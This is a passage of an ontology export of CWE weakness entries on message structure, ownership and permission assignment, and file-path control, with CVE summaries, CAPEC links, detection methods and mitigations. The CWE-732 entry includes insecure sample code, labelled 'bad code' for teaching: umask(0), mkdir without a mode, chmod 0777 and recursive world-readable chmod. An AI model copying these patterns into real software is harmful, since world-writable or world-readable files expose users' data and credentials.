     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "DoS: Crash, Exit, or Restart"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     integrity  "Unexpected State"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Source code Weakness Analyzer
Context-configured Source Code Weakness Analyzer
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Manual Source Code Review (not inspections)
Cost effective for partial coverage:
Focused Manual Spotcheck - Focused manual analysis of source
Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string
    
    
Individual: CWE-707_Improper_Enforcement_of_Message_or_Data_Structure

    Annotations: 
        rdfs:comment "If a message is malformed it may cause the message to be incorrectly interpreted.

This weakness typically applies in cases where the product prepares a control message that another process must act on, such as a command or query, and malicious input that was intended as data, can enter the control plane instead. However, this weakness also applies to more general cases where there are not always control implications."^^xsd:string,
        rdfs:comment "The software does not enforce or incorrectly enforces that structured messages or data are well-formed before being read from an upstream component or sent to a downstream component."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1020_Verify_Message_Integrity,
     
     Annotations: rdfs:comment "XML Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-250,
     related_attack_patterns  CAPEC-276,
     
     Annotations: rdfs:comment "Inter-component Protocol Manipulation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-276,
     related_attack_patterns  CAPEC-277,
     related_attack_patterns  CAPEC-278,
     related_attack_patterns  CAPEC-279,
     
     Annotations: rdfs:comment "Using Leading 'Ghost' Character Sequences to Bypass Input Filters"^^xsd:string
                 
                 related_attack_patterns  CAPEC-3,
     
     Annotations: rdfs:comment "HTTP Request Smuggling"^^xsd:string
                 
                 related_attack_patterns  CAPEC-33,
     
     Annotations: rdfs:comment "HTTP Response Splitting"^^xsd:string
                 
                 related_attack_patterns  CAPEC-34,
     
     Annotations: rdfs:comment "Exploiting Multiple Input Interpretation Layers"^^xsd:string
                 
                 related_attack_patterns  CAPEC-43,
     
     Annotations: rdfs:comment "Generic Cross-Browser Cross-Domain Theft"^^xsd:string
                 
                 related_attack_patterns  CAPEC-468,
     
     Annotations: rdfs:comment "Embedding NULL Bytes"^^xsd:string
                 
                 related_attack_patterns  CAPEC-52,
     
     Annotations: rdfs:comment "Postfix, Null Terminate, and Backslash"^^xsd:string
                 
                 related_attack_patterns  CAPEC-53,
     
     Annotations: rdfs:comment "Using Slashes and URL Encoding Combined to Bypass Validation Logic"^^xsd:string
                 
                 related_attack_patterns  CAPEC-64,
     
     Annotations: rdfs:comment "SQL Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-66,
     
     Annotations: rdfs:comment "Blind SQL Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-7,
     
     Annotations: rdfs:comment "Using Escaped Slashes in Alternate Encoding"^^xsd:string
                 
                 related_attack_patterns  CAPEC-78,
     
     Annotations: rdfs:comment "Using Slashes in Alternate Encoding"^^xsd:string
                 
                 related_attack_patterns  CAPEC-79,
     
     Annotations: rdfs:comment "XPath Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-83,
     
     Annotations: rdfs:comment "XQuery Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-84,
     ID  "707"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Other"^^xsd:string
    
    
Individual: CWE-708_Incorrect_Ownership_Assignment

    Annotations: 
        rdfs:comment "Maintenance:
This overlaps verification errors, permissions, and privileges.
A closely related weakness is the incorrect assignment of groups to a resource. It is not clear whether it would fall under this entry or require a different entry."^^xsd:string,
        rdfs:comment "The software assigns an owner to a resource, but the owner is outside of the intended control sphere."^^xsd:string,
        rdfs:comment "This may allow the resource to be manipulated by actors outside of the intended control sphere."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Product changes the ownership of files that a symlink points to, instead of the symlink itself."^^xsd:string
                 
                 references  CVE-2005-1064,
     
     Annotations: rdfs:comment "Backup software restores symbolic links with incorrect uid/gid."^^xsd:string
                 
                 references  CVE-2005-3148,
     
     Annotations: rdfs:comment "Manager does not properly restore ownership of a reusable resource when a user logs out, allowing privilege escalation."^^xsd:string
                 
                 references  CVE-2007-1716,
     
     Annotations: rdfs:comment "OS installs program with bin owner/group, allowing modification."^^xsd:string
                 
                 references  CVE-2007-4238,
     
     Annotations: rdfs:comment "File system sets wrong ownership and group when creating a new file."^^xsd:string
                 
                 references  CVE-2007-5101,
     
     Annotations: rdfs:comment "Component assigns ownership of sensitive directory tree to a user account, which can be leveraged to perform privileged operations."^^xsd:string
                 
                 references  CVE-2011-1551,
     ID  "708"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could read and modify data for which they do not have permissions to access directly."^^xsd:string
                 
                 confidentiality  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could read and modify data for which they do not have permissions to access directly."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could read and modify data for which they do not have permissions to access directly."^^xsd:string
                 
                 integrity  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could read and modify data for which they do not have permissions to access directly."^^xsd:string
                 
                 integrity  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Periodically review the privileges and their owners."^^xsd:string
                 
                 policy  ""^^xsd:string,
     
     Annotations: rdfs:comment "Use automated tools to check for privilege settings."^^xsd:string
                 
                 testing  ""^^xsd:string
    
    
Individual: CWE-732_Incorrect_Permission_Assignment_for_Critical_Resource

    Annotations: 
        rdfs:comment "Maintenance:
The relationships between privileges, permissions, and actors (e.g. users and groups) need further refinement within the Research view. One complication is that these concepts apply to two different pillars, related to control of resources (CWE-664) and protection mechanism failures (CWE-396)."^^xsd:string,
        rdfs:comment "The software specifies permissions for a security-critical resource in a way that allows that resource to be read or modified by unintended actors."^^xsd:string,
        rdfs:comment "When a resource is given a permissions setting that provides access to a wider range of actors than required, it could lead to the exposure of sensitive information, or the modification of that resource by unintended parties. This is especially dangerous when the resource is related to program configuration, execution or sensitive user data."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "\"Everyone: Full Control\" permissions assigned to a mutex allows users to disable network connectivity."^^xsd:string
                 
                 references  CVE-2001-0006,
     
     Annotations: rdfs:comment "Chain: database product contains buffer overflow that is only reachable through a .ini configuration file - which has \"Everyone: Full Control\" permissions."^^xsd:string
                 
                 references  CVE-2002-0969,
     
     Annotations: rdfs:comment "Security product uses \"Everyone: Full Control\" permissions for its configuration files."^^xsd:string
                 
                 references  CVE-2004-1714,
     
     Annotations: rdfs:comment "Database product uses read/write permissions for everyone for its shared memory, allowing theft of credentials."^^xsd:string
                 
                 references  CVE-2005-4868,
     
     Annotations: rdfs:comment "Product uses \"Everyone: Full Control\" permissions for memory-mapped files (shared memory) in inter-process communication, allowing attackers to tamper with a session."^^xsd:string
                 
                 references  CVE-2007-5544,
     
     Annotations: rdfs:comment "Product creates a share with \"Everyone: Full Control\" permissions, allowing arbitrary program execution."^^xsd:string
                 
                 references  CVE-2007-6033,
     
     Annotations: rdfs:comment "Driver installs its device interface with \"Everyone: Write\" permissions."^^xsd:string
                 
                 references  CVE-2008-0322,
     
     Annotations: rdfs:comment "VPN product stores user credentials in a registry key with \"Everyone: Full Control\" permissions, allowing attackers to steal the credentials."^^xsd:string
                 
                 references  CVE-2008-0662,
     
     Annotations: rdfs:comment "Device driver uses world-writable permissions for a socket file, allowing attackers to inject arbitrary commands."^^xsd:string
                 
                 references  CVE-2009-0115,
     
     Annotations: rdfs:comment "Terminal emulator creates TTY devices with world-writable permissions, allowing an attacker to write to the terminals of other users."^^xsd:string
                 
                 references  CVE-2009-0141,
     
     Annotations: rdfs:comment "LDAP server stores a cleartext password in a world-readable file."^^xsd:string
                 
                 references  CVE-2009-1073,
     
     Annotations: rdfs:comment "Library function copies a file to a new target and uses the source file's permissions for the target, which is incorrect when the source file is a symbolic link, which typically has 0777 permissions."^^xsd:string
                 
                 references  CVE-2009-3289,
     
     Annotations: rdfs:comment "Anti-virus product sets insecure \"Everyone: Full Control\" permissions for files under the \"Program Files\" folder, allowing attackers to replace executables with Trojan horses."^^xsd:string
                 
                 references  CVE-2009-3482,
     
     Annotations: rdfs:comment "Photo editor installs a service with an insecure security descriptor, allowing users to stop or start the service, or execute commands as SYSTEM."^^xsd:string
                 
                 references  CVE-2009-3489,
     
     Annotations: rdfs:comment "Product changes permissions to 0777 before deleting a backup; the permissions stay insecure for subsequent backups."^^xsd:string
                 
                 references  CVE-2009-3611,
     
     Annotations: rdfs:comment "Product creates directories with 0777 permissions at installation, allowing users to gain privileges and access a socket used for authentication."^^xsd:string
                 
                 references  CVE-2009-3897,
     
     Annotations: rdfs:comment "Driver installs a file with world-writable permissions."^^xsd:string
                 
                 references  CVE-2009-3939,
     
     Annotations: rdfs:comment "Accessing Functionality Not Properly Constrained by ACLs"^^xsd:string
                 
                 related_attack_patterns  CAPEC-1,
     
     Annotations: rdfs:comment "Privilege Abuse"^^xsd:string
                 
                 related_attack_patterns  CAPEC-122,
     
     Annotations: rdfs:comment "Directory Indexing"^^xsd:string
                 
                 related_attack_patterns  CAPEC-127,
     
     Annotations: rdfs:comment "Using Malicious Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-17,
     
     Annotations: rdfs:comment "Exploiting Incorrectly Configured Access Control Security Levels"^^xsd:string
                 
                 related_attack_patterns  CAPEC-180,
     
     Annotations: rdfs:comment "Signing Malicious Code"^^xsd:string
                 
                 related_attack_patterns  CAPEC-206,
     
     Annotations: rdfs:comment "Hijacking a privileged process"^^xsd:string
                 
                 related_attack_patterns  CAPEC-234,
     
     Annotations: rdfs:comment "Reusing Session IDs (aka Session Replay)"^^xsd:string
                 
                 related_attack_patterns  CAPEC-60,
     
     Annotations: rdfs:comment "Session Fixation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-61,
     
     Annotations: rdfs:comment "Cross Site Request Forgery"^^xsd:string
                 
                 related_attack_patterns  CAPEC-62,
     
     Annotations: rdfs:comment "Replace Binaries"^^xsd:string
                 
                 related_attack_patterns  CAPEC-642,
     ID  "732"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "An attacker may be able to modify critical properties of the associated resource to gain privileges, such as replacing a world-writable executable with a Trojan horse."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully defining distinct user groups, privileges, and/or roles. Map these against data, functionality, and the related resources. Then set the permissions accordingly. This will allow you to maintain more fine-grained control over your resources.
Effectiveness: Moderate
Note: This can be an effective strategy. However, in practice, it may be difficult or time consuming to define these areas when there are many different resources or user types, or if the applications features change rapidly."^^xsd:string, 
                 rdfs:comment "Strategy: Sandbox or Jail
Run the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.
OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.
This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.
Be careful to avoid CWE-243 and other weaknesses related to jails.
Effectiveness: Limited
Note: The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Formal Methods / Correct-By-Construction
Cost effective for partial coverage:
- Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
Effectiveness: High"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker may be able to read sensitive information from the associated resource, such as credentials or configuration information stored in a file."^^xsd:string
                 
                 confidentiality  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker may be able to read sensitive information from the associated resource, such as credentials or configuration information stored in a file."^^xsd:string
                 
                 confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
The following code sets the umask of the process to 0 before creating a file and writing \"Hello world\" into the file.

Example Language: C  /* (bad code) */
#define OUTFILE \"hello.out\"

umask(0);
FILE *out;
/* Ignore CWE-59 (link following) for brevity */ 

out = fopen(OUTFILE, \"w\");
if (out) {
fprintf(out, \"hello world!\\n\");
fclose(out);
}
After running this program on a UNIX system, running the \"ls -l\" command might return the following output:

(result)
 -rw-rw-rw- 1 username 13 Nov 24 17:58 hello.out
The \"rw-rw-rw-\" string indicates that the owner, group, and world (all users) can read the file and write to it."^^xsd:string, 
                 rdfs:comment "Example 2
This code creates a home directory for a new user, and makes that user the owner of the directory. If the new directory cannot be owned by the user, the directory is deleted.

Example Language: PHP  /* (bad code) */
function createUserDir($username){
$path = '/home/'.$username;
if(!mkdir($path)){
return false;
}
if(!chown($path,$username)){
rmdir($path);
return false;
}
return true;
}
Because the optional \"mode\" argument is omitted from the call to mkdir(), the directory is created with the default permissions 0777. Simply setting the new user as the owner of the directory does not explicitly change the permissions of the directory, leaving it with the default. This default allows any user to read and write to the directory, allowing an attack on the user's files. The code also fails to change the owner group of the directory, which may result in access by unexpected groups.

This code may also be vulnerable to Path Traversal (CWE-22) attacks if an attacker supplies a non alphanumeric username."^^xsd:string, 
                 rdfs:comment "Example 3
The following code snippet might be used as a monitor to periodically record whether a web site is alive. To ensure that the file can always be modified, the code uses chmod() to make the file world-writable.

Example Language: Perl  /* (bad code) */
$fileName = \"secretFile.out\";

if (-e $fileName) {
chmod 0777, $fileName;
}

my $outFH;
if (! open($outFH, \">>$fileName\")) {
ExitError(\"Couldn't append to $fileName: $!\");
}
my $dateString = FormatCurrentTime();
my $status = IsHostAlive(\"cwe.mitre.org\");
print $outFH \"$dateString cwe status: $status!\\n\";
close($outFH);
The first time the program runs, it might create a new file that inherits the permissions from its environment. A file listing might look like:

(result)
 -rw-r--r-- 1 username 13 Nov 24 17:58 secretFile.out
This listing might occur when the user has a default umask of 022, which is a common setting. Depending on the nature of the file, the user might not have intended to make it readable by everyone on the system.

The next time the program runs, however - and all subsequent executions - the chmod will set the file's permissions so that the owner, group, and world (all users) can read the file and write to it:

(result)
 -rw-rw-rw- 1 username 13 Nov 24 17:58 secretFile.out
Perhaps the programmer tried to do this because a different process uses different permissions that might prevent the file from being updated."^^xsd:string, 
                 rdfs:comment "Example 4
The following command recursively sets world-readable permissions for a directory and all of its children:

Example Language: Shell  /* (bad code) */
chmod -R ugo+r DIRNAME
If this command is run from a program, the person calling the program might not expect that all the files under the directory will be world-readable. If the directory is expected to contain private data, this could become a security problem."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Do not suggest insecure configuration changes in documentation, especially if those configurations can extend to resources and other programs that are outside the scope of the application."^^xsd:string
                 
                 documentation  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Host-based Vulnerability Scanners – Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria
- Web Application Scanner
- Web Services Scanner
- Database Scanners
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis with Automated Results Interpretation"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis"^^xsd:string, 
                 rdfs:comment "Automated dynamic analysis may be effective in detecting permission problems for system resources such as files, directories, shared memory, device interfaces, etc.
However, since the software's intended security policy might allow loose permissions for certain operations (such as publishing a file on a web server), automated dynamic analysis may produce some false positives - i.e., warnings that do not have any security consequences or require any code changes.
When custom permissions models are used - such as defining who can read messages in a particular forum in a bulletin board system - these can be difficult to detect using automated dynamic analysis. It may be possible to define custom signatures that identify any custom functions that implement the permission checks and assignments."^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.
Attach the monitor to the process and watch for library functions or system calls on OS resources such as files, directories, and shared memory. Examine the arguments to these calls to infer which permissions are being used.
Note: Note that this technique is only useful for permissions issues related to system resources. It is not likely to detect application-level business rules that are related to permissions, such as if a user of a blog system marks a post as \"private,\" but the blog system inadvertently marks it as \"public.\""^^xsd:string
                 
                 dynamic  "black box"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Host Application Interface Scanner
Cost effective for partial coverage:
- Fuzz Tester
- Framework-based Fuzzer
- Automated Monitored Execution
- Forced Path Execution
Effectiveness: High"^^xsd:string, 
                 rdfs:comment "Analysis with Manual Results Interpretation"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis"^^xsd:string, 
                 rdfs:comment "Manual dynamic analysis may be effective in detecting the use of custom permissions models and functions. The program could then be executed with a focus on exercising code paths that are related to the custom permissions. Then the human analyst could evaluate permission assignments in the context of the intended security model of the software."^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Fuzzing is not effective in detecting this weakness."^^xsd:string
                 
                 fuzzing  ""^^xsd:string,
     
     Annotations: rdfs:comment "During program startup, explicitly set the default permissions or umask to the most restrictive setting possible. Also set the appropriate permissions during program installation. This will prevent you from inheriting insecure permissions from any user who installs or runs the program.
Effectiveness: High"^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "The developer might make certain assumptions about the environment in which the software runs - e.g., that the software is running on a single-user system, or the software is only accessible to trusted administrators. When the software is running in a different environment, the permissions become a problem."^^xsd:string, 
                 rdfs:comment "When using a critical resource such as a configuration file, check to see if the resource has insecure permissions (such as being modifiable by any regular user), and generate an error or even exit the software if there is a possibility that the resource could have been modified by an unauthorized party."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Do not assume that a system administrator will manually change the configuration to the settings that are recommended in the software's manual."^^xsd:string, 
                 rdfs:comment "During program startup, explicitly set the default permissions or umask to the most restrictive setting possible. Also set the appropriate permissions during program installation. This will prevent you from inheriting insecure permissions from any user who installs or runs the program.
Effectiveness: High"^^xsd:string, 
                 rdfs:comment "The developer may set loose permissions in order to minimize problems when the user first runs the program, then create documentation stating that permissions should be tightened. Since system administrators and users do not always read the documentation, this can result in insecure permissions being left unchanged."^^xsd:string
                 
                 installation  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker may be able to destroy or corrupt critical data in the associated resource, such as deletion of records from a database."^^xsd:string
                 
                 integrity  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker may be able to destroy or corrupt critical data in the associated resource, such as deletion of records from a database."^^xsd:string
                 
                 integrity  "Other"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Environment Hardening
Ensure that the software runs properly under the Federal Desktop Core Configuration (FDCC) [REF-199] or an equivalent hardening configuration guide, which many organizations use to limit the attack surface and potential risk of deployed software."^^xsd:string, 
                 rdfs:comment "Strategy: Sandbox or Jail
Run the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.
OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.
This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.
Be careful to avoid CWE-243 and other weaknesses related to jails.
Effectiveness: Limited
Note: The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker may be able to destroy or corrupt critical data in the associated resource, such as deletion of records from a database."^^xsd:string
                 
                 other  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker may be able to destroy or corrupt critical data in the associated resource, such as deletion of records from a database."^^xsd:string
                 
                 other  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Configuration Checker
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Context-configured Source Code Weakness Analyzer
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Inter-application Flow Analysis
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis"^^xsd:string, 
                 rdfs:comment "Automated static analysis may be effective in detecting permission problems for system resources such as files, directories, shared memory, device interfaces, etc. Automated techniques may be able to detect the use of library functions that modify permissions, then analyze function calls for arguments that contain potentially insecure values.
However, since the software's intended security policy might allow loose permissions for certain operations (such as publishing a file on a web server), automated static analysis may produce some false positives - i.e., warnings that do not have any security consequences or require any code changes.
When custom permissions models are used - such as defining who can read messages in a particular forum in a bulletin board system - these can be difficult to detect using automated static analysis. It may be possible to define custom signatures that identify any custom functions that implement the permission checks and assignments."^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Manual Source Code Review (not inspections)
Cost effective for partial coverage:
- Focused Manual Spotcheck - Focused manual analysis of source
Effectiveness: High"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis"^^xsd:string, 
                 rdfs:comment "Manual static analysis may be effective in detecting the use of custom permissions models and functions. The code could then be examined to identifying usage of the related functions. Then the human analyst could evaluate permission assignments in the context of the intended security model of the software."^^xsd:string, 
                 rdfs:comment "This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.
Note: These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "For all configuration files, executables, and libraries, make sure that they are only readable and writable by the software's administrator.
Effectiveness: High"^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening
Ensure that the software runs properly under the Federal Desktop Core Configuration (FDCC) [REF-199] or an equivalent hardening configuration guide, which many organizations use to limit the attack surface and potential risk of deployed software."^^xsd:string
                 
                 system_configuration  ""^^xsd:string
    
    
Individual: CWE-73_External_Control_of_File_Name_or_Path

    Annotations: 
        rdfs:comment "Relationship:
The external control of filenames can be the primary link in chains with other file-related weaknesses, as seen in the CanPrecede relationships. This is because software systems use files for many different purposes: to execute programs, load code libraries, to store application data, to store configuration settings, record temporary data, act as signals or semaphores to other processes, etc.

However, those weaknesses do not always require external control. For example, link-following weaknesses (CWE-59) often involve pathnames that are not controllable by the attacker at all.

The external control can be resultant from other issues. For example, in PHP applications, the register_globals setting can allow an attacker to modify variables that the programmer thought were immutable, enabling file inclusion (CWE-98) and path traversal (CWE-22). Operating with excessive privileges (CWE-250) might allow an attacker to specify an input filename that is not directly readable by the attacker, but is accessible to the privileged program. A buffer overflow (CWE-119) might give an attacker control over nearby memory locations that are related to pathnames, but were not directly modifiable by the attacker."^^xsd:string,
        rdfs:comment "The software allows user input to control or influence paths or file names that are used in filesystem operations."^^xsd:string,
        rdfs:comment "This could allow an attacker to access or modify system files or other files that are critical to the application.

Path manipulation errors occur when the following two conditions are met:

1. An attacker can specify a path used in an operation on the filesystem.
2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.
For example, the program may give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1015_Limit_Access,
     
     Annotations: rdfs:comment "Chain: external control of values for user's desired language and theme enables path traversal."^^xsd:string
                 
                 references  CVE-2008-5748,
     
     Annotations: rdfs:comment "Chain: external control of user's target language enables remote file inclusion."^^xsd:string
                 
                 references  CVE-2008-5764,
     
     Annotations: rdfs:comment "Subverting Environment Variable Values"^^xsd:string
                 
                 related_attack_patterns  CAPEC-13,
     
     Annotations: rdfs:comment "Leverage Alternate Encoding"^^xsd:string
                 
                 related_attack_patterns  CAPEC-267,
     
     Annotations: rdfs:comment "Using Slashes and URL Encoding Combined to Bypass Validation Logic"^^xsd:string
                 
                 related_attack_patterns  CAPEC-64,
     
     Annotations: rdfs:comment "URL Encoding"^^xsd:string
                 
                 related_attack_patterns  CAPEC-72,
     
     Annotations: rdfs:comment "Manipulating Web Input to File System Calls"^^xsd:string
                 
                 related_attack_patterns  CAPEC-76,
     
